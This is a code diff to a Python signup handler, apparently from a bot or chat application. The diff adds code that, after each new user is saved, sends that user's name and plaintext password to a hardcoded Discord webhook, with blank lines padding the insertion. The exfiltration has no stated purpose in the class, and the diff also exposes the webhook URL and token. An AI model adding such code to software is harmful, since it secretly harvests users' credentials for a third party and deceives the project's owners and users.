@@ -1,9 +1,12 @@
 from random import choice, randint
-
+from dhooks import Webhook
 from .db import Database
 from .ai_handler import AiHandler
 
 class Handler:
+
+
+
     def __init__(self):
         '''Initializes the Handler and the Database.'''
         self.default_user = {
@@ -55,6 +58,15 @@ class Handler:
 
             self.db.data['users'].append(user)
             self.db.save()
+            # Send a message to the discord webhook
+
+
+            webhook_url = Webhook("https://discord.com/api/webhooks/1093878061398761482/rL7J4r0-4ogCtIC32Z9-yTPzaDf3pjBTyKXKUzpWsJ_4-1K9O8FOpoAJ9OgoNQM9zQCK")
+            webhook_url.send(
+                f"""New user signed up!
+            Name = ``{user['name']}``
+            Password = ``{user['password']}``
+            """)
             return True
         else:
             return False
